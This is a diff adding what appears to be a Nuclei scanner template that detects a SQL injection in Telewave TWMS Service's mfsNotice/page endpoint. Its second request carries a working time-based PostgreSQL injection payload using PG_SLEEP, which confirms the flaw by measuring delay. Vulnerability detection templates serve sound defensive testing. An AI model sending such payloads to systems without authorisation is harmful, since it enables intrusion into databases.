@@ -1,0 +1,56 @@
+id: twms-service-mfs-sqli
+info:
+  name: Telewave TWMS Service SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Telewave TWMS Service is vulnerable to a SQL injection vulnerability that can be exploited via crafted payloads in the POST request to the /twms-service-mfs/mfsNotice/page endpoint.
+
+variables:
+  t1: '{{rand_int(1, 5)}}'
+  t2: '{{to_number(t1) + to_number(t1)}}'
+  t3: '{{to_number(t2) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /twms-service-mfs/mfsNotice/page HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930"'},"hgubmt748n4":"="}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: body
+        words:
+          - "JSON parse error"
+          - "JsonMappingException"
+
+  - raw:
+      - |
+        POST /twms-service-mfs/mfsNotice/page HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP({{t1}})) AND ('oJoi'='oJoi"},"hgubmt748n4":"="}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"msg\":\"请求成功\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2) && duration < to_number(t3)"
